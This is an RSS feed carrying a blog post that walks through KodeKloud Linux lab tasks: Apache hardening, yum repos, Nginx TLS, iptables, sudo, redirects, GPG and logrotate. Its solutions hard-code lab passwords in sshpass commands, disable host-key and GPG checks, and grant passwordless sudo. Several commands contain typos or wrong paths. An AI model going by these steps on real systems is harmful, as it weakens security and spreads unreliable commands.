<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Chamsii Mouhib</title><link>https://chxmxii.github.io/portfolio/posts/</link><description>Recent content in Posts on Chamsii Mouhib</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 15 Aug 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://chxmxii.github.io/portfolio/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>KodeKloud Engineer Linux Challenges</title><link>https://chxmxii.github.io/portfolio/posts/2023/08/kodekloud-engineer-linux-challenges/</link><pubDate>Tue, 15 Aug 2023 00:00:00 +0000</pubDate><guid>https://chxmxii.github.io/portfolio/posts/2023/08/kodekloud-engineer-linux-challenges/</guid><description>Web Server Security During a recent security audit, the application security team of xFusionCorp Industries found security issues with the Apache web server on Nautilus App Server 1 server in Stratos DC. They have listed several security issues that need to be fixed on this server. Please apply the security settings below: a. On Nautilus App Server 1 it was identified that the Apache web server is exposing the version number.</description><content type="html"><![CDATA[<hr>
<h2 id="web-server-security">Web Server Security</h2>
<ul>
<li>During a recent security audit, the application security team of xFusionCorp Industries found security issues with the Apache web server on Nautilus App Server 1 server in Stratos DC. They have listed several security issues that need to be fixed on this server. Please apply the security settings below:</li>
<li>a. On Nautilus App Server 1 it was identified that the Apache web server is exposing the version number. Ensure this server has the appropriate settings to hide the version number of the Apache web server.</li>
<li>b. There is a website hosted under /var/www/html/blog on App Server 1. It was detected that the directory /blog lists all of its contents while browsing the URL. Disable the directory browser listing in Apache config.</li>
<li>c. Also make sure to restart the Apache service after making the changes.</li>
</ul>
<h6 id="solution">Solution</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#ssh to the app server 1</span>
</span></span><span style="display:flex;"><span>sshpass -p Ir0nM@n -o StrictHostKeyChecking<span style="color:#f92672">=</span>no tony@stapp01
</span></span><span style="display:flex;"><span><span style="color:#75715e">#check the httpd status</span>
</span></span><span style="display:flex;"><span>sudo systemctl status httpd
</span></span><span style="display:flex;"><span><span style="color:#75715e">#open the httpd.conf file with vi</span>
</span></span><span style="display:flex;"><span>sudo vi /etc/httpd/conf/httpd.conf
</span></span><span style="display:flex;"><span><span style="color:#75715e">#a. to disable the version discolusre you can append the following two lines to the httpd.conf</span>
</span></span><span style="display:flex;"><span>.&gt; ServerTokens Prod
</span></span><span style="display:flex;"><span>.&gt; ServerSignature Off
</span></span><span style="display:flex;"><span><span style="color:#75715e">#b. to disable the directory browser listing, make sure to remove Indexes from options</span>
</span></span><span style="display:flex;"><span>Before &gt; Options Indexes FollowSymLinks
</span></span><span style="display:flex;"><span>After &gt; Options FollowSymLinks
</span></span><span style="display:flex;"><span><span style="color:#75715e">#save and quit</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#c. restart the server and curl to verify</span>
</span></span><span style="display:flex;"><span>sudo systemctl start httpd <span style="color:#f92672">&amp;&amp;</span> sudo systemctl status httpd
</span></span><span style="display:flex;"><span>curl -I stapp01:8080/
</span></span><span style="display:flex;"><span><span style="color:#75715e">#TIP: you can press &#34;/&#34; and write &#34;Options&#34; in vi to search for that line. press n to move to the next matched item.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ref: https://www.tecmint.com/hide-apache-web-server-version-information/</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ref: https://stackoverflow.com/questions/2530372/how-do-i-disable-directory-browsing</span>
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="configure-local-yum-repos">Configure Local Yum repos</h2>
<ul>
<li>The Nautilus production support team and security team had a meeting last month in which they decided to use local yum repositories for maintaing packages needed for their servers. For now they have decided to configure a local yum repo on Nautilus Backup Server. This is one of the pending items from last month, so please configure a local yum repository on Nautilus Backup Server as per details given below.</li>
<li>a. We have some packages already present at location /packages/downloaded_rpms/ on Nautilus Backup Server.</li>
<li>b. Create a yum repo named epel_local and make sure to set Repository ID to epel_local. Configure it to use package&rsquo;s location /packages/downloaded_rpms/.</li>
<li>c. Install package vim-enhanced from this newly created repo.</li>
</ul>
<h6 id="solution-1">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#Connect to the backup server</span>
</span></span><span style="display:flex;"><span>sshpass -p H@wk3y3	ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no clint@stbkp01
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Switch to the root user</span>
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span><span style="color:#75715e">#there is actually 2 ways to create yum repos, either you do it manually or you can do it with &#34;yum-config-manager --add-repo=&lt;url&gt;&#34;</span>
</span></span><span style="display:flex;"><span>cat &lt;&lt;<span style="color:#ae81ff">\ </span>EOF &gt; /etc/yum_repos.d/epel_local.repo
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>epel_local<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>name<span style="color:#f92672">=</span>epel_local
</span></span><span style="display:flex;"><span>baseurl<span style="color:#f92672">=</span>file:///packages/downloaded_rpms/
</span></span><span style="display:flex;"><span>enabled<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>gpgcheck<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>EOF
</span></span><span style="display:flex;"><span><span style="color:#75715e">#clean and list the repos</span>
</span></span><span style="display:flex;"><span>yum clean all
</span></span><span style="display:flex;"><span>yum repo list
</span></span><span style="display:flex;"><span><span style="color:#75715e">#install the vim-enhanced</span>
</span></span><span style="display:flex;"><span>yum install vim-enhanced -y
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="setup-ssl-for-nginx">Setup SSL for Nginx</h2>
<ul>
<li>The system admins team of xFusionCorp Industries needs to deploy a new application on App Server 1 in Stratos Datacenter. They have some pre-requites to get ready that server for application deployment. Prepare the server as per requirements shared below:</li>
<li>Install and configure nginx on App Server 1.</li>
<li>On App Server 1 there is a self signed SSL certificate and key present at location /tmp/nautilus.crt and /tmp/nautilus.key. Move them to some appropriate location and deploy the same in Nginx.</li>
<li>Create an index.html file with content Welcome! under Nginx document root.</li>
<li>For final testing try to access the App Server 2 link (either hostname or IP) from jump host using curl command. For example curl -Ik https://<!-- raw HTML omitted -->/.</li>
</ul>
<h6 id="solution-2">Solution</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#ssh to the app server 1</span>
</span></span><span style="display:flex;"><span>sshpass -p Ir0nM@n ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no tony@stapp01
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Switch to root user</span>
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span><span style="color:#75715e">#search for the nginx package</span>
</span></span><span style="display:flex;"><span>yum whatprovides nginx
</span></span><span style="display:flex;"><span>yum search nginx
</span></span><span style="display:flex;"><span><span style="color:#75715e">#install epel-release &amp; nginx</span>
</span></span><span style="display:flex;"><span>yum install epel-release -y
</span></span><span style="display:flex;"><span>yum install nginx
</span></span><span style="display:flex;"><span><span style="color:#75715e">#copy the self-signed cert</span>
</span></span><span style="display:flex;"><span>cp /tmp/nautilus.crt /etc/pki/CA/certs/ <span style="color:#f92672">&amp;&amp;</span> cp /tmp/nautilus.key /etc/pki/CA/private/
</span></span></code></pre></div>edit the /etc/nginx/nginx.conf to look like this</li>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#For more information on configuration, see:</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#* Official English Documentation: http://nginx.org/en/docs/</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#* Official Russian Documentation: http://nginx.org/ru/docs/</span>
</span></span><span style="display:flex;"><span>user nginx;
</span></span><span style="display:flex;"><span>worker_processes auto;
</span></span><span style="display:flex;"><span>error_log /var/log/nginx/error.log;
</span></span><span style="display:flex;"><span>pid /run/nginx.pid;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Load dynamic modules. See /usr/share/doc/nginx/README.dynamic.</span>
</span></span><span style="display:flex;"><span>include /usr/share/nginx/modules/*.conf;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>events <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    worker_connections 1024;
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>http <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    log_format  main  <span style="color:#e6db74">&#39;$remote_addr - $remote_user [$time_local] &#34;$request&#34; &#39;</span>
</span></span><span style="display:flex;"><span>                      <span style="color:#e6db74">&#39;$status $body_bytes_sent &#34;$http_referer&#34; &#39;</span>
</span></span><span style="display:flex;"><span>                      <span style="color:#e6db74">&#39;&#34;$http_user_agent&#34; &#34;$http_x_forwarded_for&#34;&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    access_log  /var/log/nginx/access.log  main;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    sendfile            on;
</span></span><span style="display:flex;"><span>    tcp_nopush          on;
</span></span><span style="display:flex;"><span>    tcp_nodelay         on;
</span></span><span style="display:flex;"><span>    keepalive_timeout   65;
</span></span><span style="display:flex;"><span>    types_hash_max_size 4096;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    include             /etc/nginx/mime.types;
</span></span><span style="display:flex;"><span>    default_type        application/octet-stream;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Load modular configuration files from the /etc/nginx/conf.d directory.</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># See http://nginx.org/en/docs/ngx_core_module.html#include</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># for more information.</span>
</span></span><span style="display:flex;"><span>    include /etc/nginx/conf.d/*.conf;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    server <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        listen       80;
</span></span><span style="display:flex;"><span>        listen       <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:80;
</span></span><span style="display:flex;"><span>        server_name  &lt;your_server_ip_here&gt;;
</span></span><span style="display:flex;"><span>        root         /usr/share/nginx/html;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Load configuration files for the default server block.</span>
</span></span><span style="display:flex;"><span>        include /etc/nginx/default.d/*.conf;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        error_page <span style="color:#ae81ff">404</span> /404.html;
</span></span><span style="display:flex;"><span>        location <span style="color:#f92672">=</span> /404.html <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        error_page <span style="color:#ae81ff">500</span> <span style="color:#ae81ff">502</span> <span style="color:#ae81ff">503</span> <span style="color:#ae81ff">504</span> /50x.html;
</span></span><span style="display:flex;"><span>        location <span style="color:#f92672">=</span> /50x.html <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Settings for a TLS enabled server.</span>
</span></span><span style="display:flex;"><span>    server <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        listen       <span style="color:#ae81ff">443</span> ssl http2;
</span></span><span style="display:flex;"><span>        listen       <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:443 ssl http2;
</span></span><span style="display:flex;"><span>        server_name  &lt;your_server_ip_from_here&gt;;
</span></span><span style="display:flex;"><span>        root         /usr/share/nginx/html;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        ssl_certificate <span style="color:#e6db74">&#34;/etc/pki/CA/certs/nautilus.crt&#34;</span>;
</span></span><span style="display:flex;"><span>        ssl_certificate_key <span style="color:#e6db74">&#34;/etc/pki/CA/private/nautilus.key&#34;</span>;
</span></span><span style="display:flex;"><span>        ssl_session_cache shared:SSL:1m;
</span></span><span style="display:flex;"><span>        ssl_session_timeout  10m;
</span></span><span style="display:flex;"><span>        ssl_ciphers HIGH:!aNULL:!MD5;
</span></span><span style="display:flex;"><span>        ssl_prefer_server_ciphers on;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Load configuration files for the default server block.</span>
</span></span><span style="display:flex;"><span>        include /etc/nginx/default.d/*.conf;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        error_page <span style="color:#ae81ff">404</span> /404.html;
</span></span><span style="display:flex;"><span>            location <span style="color:#f92672">=</span> /40x.html <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        error_page <span style="color:#ae81ff">500</span> <span style="color:#ae81ff">502</span> <span style="color:#ae81ff">503</span> <span style="color:#ae81ff">504</span> /50x.html;
</span></span><span style="display:flex;"><span>            location <span style="color:#f92672">=</span> /50x.html <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span></code></pre></div>Now lets add index.html file and start the nginx service</li>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#Now, you will have to remove the index.html under the nginx root because is linked to another file.</span>
</span></span><span style="display:flex;"><span>rm -rf /usr/share/nginx/html/index.html
</span></span><span style="display:flex;"><span><span style="color:#75715e">#create new index.html under nginx root contains &#34;welcome!&#34;</span>
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;Welcome!&#34;</span> &gt; /usr/share/nginx/html/index.html
</span></span><span style="display:flex;"><span><span style="color:#75715e">#start nginx </span>
</span></span><span style="display:flex;"><span>systemctl start nginx
</span></span><span style="display:flex;"><span>systemctl status
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify</span>
</span></span><span style="display:flex;"><span>curl localhot
</span></span><span style="display:flex;"><span><span style="color:#75715e">#going back to the jump host lets curl</span>
</span></span><span style="display:flex;"><span>curl -Ik https://172.16.238.10	
</span></span><span style="display:flex;"><span>curl -k https://172.16.238.10
</span></span></code></pre></div><hr>
</li>
</ul>
<h2 id="application-security">Application Security</h2>
<ul>
<li>We have a backup management application UI hosted on Nautilus backup server in Stratos DC. That backup management application code is deployed under Apache on the backup server itself, and Nginx is running as a reverse proxy on the same server. Apache and Nginx ports are 6100 and 8093, respectively. We have iptables firewall installed on this server. Make the appropriate changes to fulfill the requirements mentioned below:</li>
<li>a. We want to open all incoming connections to Nginx&rsquo;s port and block all incoming connections to Apache&rsquo;s port. Also make sure rules are permanent.</li>
</ul>
<h6 id="solution-3">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#ssh to the backup server</span>
</span></span><span style="display:flex;"><span>sshpass -p H@wk3y3 ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no clint@stbkp01
</span></span><span style="display:flex;"><span><span style="color:#75715e">#switch to root user</span>
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify the ports of nginx and apache</span>
</span></span><span style="display:flex;"><span>ss -lntp | grep nginx
</span></span><span style="display:flex;"><span>ss -lntp | grep http
</span></span><span style="display:flex;"><span><span style="color:#75715e">#configure the firewall to match the desired behavior</span>
</span></span><span style="display:flex;"><span>iptables -A INPUT -p tcp --dport <span style="color:#ae81ff">8093</span> -m conntrack --cstate NEW,ESTABLISHED -j ACCEPT
</span></span><span style="display:flex;"><span>iptables -A INPUT -p tcp --dport <span style="color:#ae81ff">6100</span> -m conntrack --cstate NEW -j REJECT
</span></span><span style="display:flex;"><span><span style="color:#75715e">#save the rules to remain permanent</span>
</span></span><span style="display:flex;"><span>sudo iptables-save &gt; /etc/sysconfig/iptables
</span></span><span style="display:flex;"><span>service iptables save
</span></span><span style="display:flex;"><span><span style="color:#75715e">#veriffy</span>
</span></span><span style="display:flex;"><span>cat /etc/sysconfig/iptables
</span></span><span style="display:flex;"><span>iptables -L -n -v
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify from jump host</span>
</span></span><span style="display:flex;"><span>telnet stkbp01 <span style="color:#ae81ff">8093</span>
</span></span><span style="display:flex;"><span>telnet stkbp01 <span style="color:#ae81ff">6100</span>
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="bash-script">Bash Script</h2>
<ul>
<li>The production support team of xFusionCorp Industries is working on developing some bash scripts to automate different day to day tasks. One is to create a bash script for taking websites backup. They have a static website running on App Server 1 in Stratos Datacenter, and they need to create a bash script named official_backup.sh which should accomplish the following tasks. (Also remember to place the script under /scripts directory on App Server 1)</li>
<li>a. Create a zip archive named xfusioncorp_official.zip of /var/www/html/official directory.</li>
<li>b. Save the archive in /backup/ on App Server 1. This is a temporary storage, as backups from this location will be clean on weekly basis. Therefore, we also need to save this backup archive on Nautilus Backup Server.</li>
<li>c. Copy the created archive to Nautilus Backup Server server in /backup/ location.</li>
<li>d. Please make sure script won&rsquo;t ask for password while copying the archive file. Additionally, the respective server user (for example, tony in case of App Server 1) must be able to run it.</li>
</ul>
<h6 id="solution-4">Solution:</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#ssh to app server 1</span>
</span></span><span style="display:flex;"><span>sshpass -p Ir0nM@n ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no tony@stapp01
</span></span><span style="display:flex;"><span><span style="color:#75715e">#cd to /scripts folder and create a official_backup.sh file</span>
</span></span><span style="display:flex;"><span>cd /scripts
</span></span><span style="display:flex;"><span>vi official_backup.sh
</span></span></code></pre></div>After opening the officila_backup.sh file, copy the following script, save and quit.</li>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#make an archive for the official folder under /var/www/html/ &#34;-r for recurisve&#34; </span>
</span></span><span style="display:flex;"><span>zip -r /backup/xfusioncorp_official.zip /var/www/html/official
</span></span><span style="display:flex;"><span><span style="color:#75715e">#copy the archive file to the backup server</span>
</span></span><span style="display:flex;"><span>scp /backup/xfusioncorp_official.zip clint@stbkp01:/backup/
</span></span></code></pre></div>now, to make sure the script won&rsquo;t ask for password while copying the archive file, lets generate a ssh key</li>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#generate an ssh key</span>
</span></span><span style="display:flex;"><span>ssh-keygen
</span></span><span style="display:flex;"><span><span style="color:#75715e">#copy the generated key to the backup server</span>
</span></span><span style="display:flex;"><span>ssh-copy-id clint@stbkp01
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ssh to verify</span>
</span></span><span style="display:flex;"><span>ssh clint@stkp01
</span></span><span style="display:flex;"><span><span style="color:#75715e">#add exec perm to the official_backup.sh file</span>
</span></span><span style="display:flex;"><span>chmod +x official_backup.sh
</span></span><span style="display:flex;"><span><span style="color:#75715e">#run the script</span>
</span></span><span style="display:flex;"><span>./official_backup
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ssh to backserver and verify</span>
</span></span><span style="display:flex;"><span>ssh clint@stkp01
</span></span><span style="display:flex;"><span>ls /backup/
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="linux-configure-sudo">Linux Configure sudo</h2>
<ul>
<li>We have some users on all app servers in Stratos Datacenter. Some of them have been assigned some new roles and responsibilities, therefore their users need to be upgraded with sudo access so that they can perform admin level tasks.</li>
<li>a. Provide sudo access to user james on all app servers.</li>
<li>b. Make sure you have set up password-less sudo for the user.</li>
</ul>
<h6 id="solution-">Solution :</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#ssh to all app servers one by one</span>
</span></span><span style="display:flex;"><span>ssh -p &lt;password&gt; ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no &lt;name&gt;@&lt;hostname&gt;
</span></span><span style="display:flex;"><span><span style="color:#75715e">#switch to root user</span>
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Provide sudo access to user james</span>
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;james ALL=(ALL) NOPASSWD:ALL&#34;</span> &gt; /etc/sudoer.d/james
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify</span>
</span></span><span style="display:flex;"><span>su james
</span></span><span style="display:flex;"><span>sudo id
</span></span><span style="display:flex;"><span>sudo su
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="apache-redirects">Apache Redirects</h2>
<ul>
<li>The Nautilus devops team got some requirements related to some Apache config changes. They need to setup some redirects for some URLs. There might be some more changes need to be done. Below you can find more details regarding that:</li>
<li>httpd is already installed on app server 3. Configure Apache to listen on port 5003.</li>
<li>Configure Apache to add some redirects as mentioned below:
a.) Redirect <a href="http://stapp03.stratos.xfusioncorp.com">http://stapp03.stratos.xfusioncorp.com</a>:<!-- raw HTML omitted -->/ to <a href="http://www.stapp03.stratos.xfusioncorp.com">http://www.stapp03.stratos.xfusioncorp.com</a>:<!-- raw HTML omitted -->/ i.e non www to www. This must be a permanent redirect i.e 301
b.) Redirect <a href="http://www.stapp03.stratos.xfusioncorp.com">http://www.stapp03.stratos.xfusioncorp.com</a>:<!-- raw HTML omitted -->/blog/ to <a href="http://www.stapp03.stratos.xfusioncorp.com">http://www.stapp03.stratos.xfusioncorp.com</a>:<!-- raw HTML omitted -->/news/. This must be a temporary redirect i.e 302.</li>
</ul>
<h6 id="solution--1">Solution :</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#ssh to app server 3</span>
</span></span><span style="display:flex;"><span>sshpass -p BigGr33n ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no banner@stapp03
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Switch to the root user</span>
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify httpd is alr installed</span>
</span></span><span style="display:flex;"><span>rpm -qa | grep httpd
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Configure apache to listen on port 5003</span>
</span></span><span style="display:flex;"><span>vi /etc/httpd/conf/httpd.conf
</span></span><span style="display:flex;"><span>Look <span style="color:#66d9ef">for</span> the line that starts with Listen and change it to &gt; Listen <span style="color:#ae81ff">5003</span>
</span></span></code></pre></div>Configure redirection</li>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span>vi /etc/httpd/conf.d/main.conf
</span></span><span style="display:flex;"><span><span style="color:#75715e">#copy the following lines</span>
</span></span><span style="display:flex;"><span>&lt;VirtualHost *:5003&gt;
</span></span><span style="display:flex;"><span>ServerName http://stapp03.stratos.xfusioncorp.com:5003/
</span></span><span style="display:flex;"><span>Redirect <span style="color:#ae81ff">301</span> /  http://www.stapp03.stratos.xfusioncorp.com:5003/
</span></span><span style="display:flex;"><span>&lt;/VirtualHost&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;VirtualHost *:5003&gt;
</span></span><span style="display:flex;"><span>ServerName http://www.stapp03.stratos.xfusioncorp.com:5003/blog/
</span></span><span style="display:flex;"><span>Redirect <span style="color:#ae81ff">302</span> / http://www.stapp03.stratos.xfusioncorp.com:5003/news/
</span></span><span style="display:flex;"><span>&lt;/VirtualHost&gt;
</span></span></code></pre></div></li>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#Restart htttpd</span>
</span></span><span style="display:flex;"><span>systemctl restartd httpd
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Verify </span>
</span></span><span style="display:flex;"><span>curl http://stapp03.stratos.xfusioncorp.com:5003/
</span></span><span style="display:flex;"><span>curl http://www.stapp03.stratos.xfusioncorp.com:5003/
</span></span><span style="display:flex;"><span>curl http://www.stapp03.stratos.xfusioncorp.com:5003/blog/
</span></span><span style="display:flex;"><span>curl http://www.stapp03.stratos.xfusioncorp.com:5003/news
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="linux-gpg-encryption">Linux GPG Encryption</h2>
<ul>
<li>We have confidential data that needs to be transferred to a remote location, so we need to encrypt that data.We also need to decrypt data we received from a remote location in order to understand its content.</li>
<li>On storage server in Stratos Datacenter we have private and public keys stored /home/*_key.asc. Use those keys to perform the following actions.</li>
<li>Encrypt /home/encrypt_me.txt to /home/encrypted_me.asc.</li>
<li>Decrypt /home/decrypt_me.asc to /home/decrypted_me.txt. (Passphrase for decryption and encryption is kodekloud).</li>
</ul>
<h6 id="solution-5">Solution</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#ssh to the storage server</span>
</span></span><span style="display:flex;"><span>sshpass -p Bl@ckW ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no natasha@ststor01
</span></span><span style="display:flex;"><span><span style="color:#75715e">#swith to the root user</span>
</span></span><span style="display:flex;"><span>sudo su -
</span></span><span style="display:flex;"><span><span style="color:#75715e">#check for the keys</span>
</span></span><span style="display:flex;"><span>ls /home/
</span></span><span style="display:flex;"><span>cat /home/encrypt_me.txt
</span></span><span style="display:flex;"><span>cat /home/decrypt_me
</span></span><span style="display:flex;"><span>cd /home
</span></span><span style="display:flex;"><span><span style="color:#75715e">#Import the keys </span>
</span></span><span style="display:flex;"><span>gpg --import public_key.asc
</span></span><span style="display:flex;"><span>gpg --import private_key.asc
</span></span><span style="display:flex;"><span><span style="color:#75715e">#verify</span>
</span></span><span style="display:flex;"><span>gpg --list-keys
</span></span><span style="display:flex;"><span>gpg --list-secret-keys
</span></span><span style="display:flex;"><span><span style="color:#75715e">#encryp the encrypt_me.txt file</span>
</span></span><span style="display:flex;"><span>gpg --encrypt -r kodekloud@kodekloud.com --armor &lt; encrypt_me.txt -o encrypted_me.asc
</span></span><span style="display:flex;"><span><span style="color:#75715e">#decrypt the message, you will be prompted with a passphrase which is &#34;kodekloud&#34;</span>
</span></span><span style="display:flex;"><span>gpg --decrypt decrypt_me.asc &gt; decrypted_me.txt
</span></span><span style="display:flex;"><span><span style="color:#75715e">#validate</span>
</span></span><span style="display:flex;"><span>cat decrypted_me.txt
</span></span><span style="display:flex;"><span>cat decrypt_me.asc
</span></span><span style="display:flex;"><span>cat encrypt_me.txt
</span></span><span style="display:flex;"><span>cat encrpyed_me.asc
</span></span></code></pre></div></li>
</ul>
<hr>
<h2 id="linux-logrotate">Linux LogRotate</h2>
<ul>
<li>The Nautilus DevOps team is ready to launch a new application, which they will deploy on app servers in Stratos Datacenter. They are expecting significant traffic/usage of httpd on app servers after that. This will generate massive logs, creating huge log files. To utilise the storage efficiently, they need to compress the log files and need to rotate old logs. Check the requirements shared below:</li>
<li>a. In all app servers install httpd package.</li>
<li>b. Using logrotate configure httpd logs rotation to monthly and keep only 3 rotated logs.
(If by default log rotation is set, then please update configuration as needed)</li>
</ul>
<h6 id="solution--2">Solution :</h6>
<ul>
<li>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Shell" data-lang="Shell"><span style="display:flex;"><span><span style="color:#75715e">#ssh to the app server</span>
